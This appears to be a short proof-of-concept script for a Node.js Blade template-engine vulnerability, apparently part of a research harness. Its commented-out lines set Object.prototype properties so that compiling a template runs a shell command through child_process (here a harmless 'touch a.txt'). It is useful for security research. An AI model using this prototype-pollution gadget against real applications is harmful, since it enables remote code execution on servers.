const blade = require('blade');

/**
 * prototype pollution
 */
// Object.prototype.name = "somename"
// Object.prototype.value = "somevalue"
// Object.prototype.code = "process.mainModule.require('child_process').execSync(\`touch a.txt\`)"

const template = `html
    head
        title Blade
    body
        #nav
            ul
                - for(var i in nav)
                    li
                        a(href=nav[i])= i
        #content.center
            h1 Blade is cool`;

// for node-find-undefined
console.log("===========start===========")

blade.compile(template, {'debug': true}, function(err, tmpl) {
    tmpl({'nav': []}, function(err, html) {
        console.log(html, err);
    });
});
console.log("===========end===========")